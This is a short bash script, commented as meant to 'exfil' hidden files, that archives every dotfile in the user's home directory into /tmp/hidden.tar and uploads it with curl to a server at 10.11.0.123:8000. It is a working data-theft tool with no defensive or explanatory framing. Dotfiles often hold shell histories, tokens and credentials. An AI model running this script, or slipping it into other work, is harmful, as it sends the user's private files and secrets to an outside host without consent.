#!/bin/bash
# Find hidden files and exfil those

find ~ -type f -name ".*" -exec tar -rvf /tmp/hidden.tar {} \;
curl -X POST -F "file=@/tmp/hidden.tar" http://10.11.0.123:8000/upload
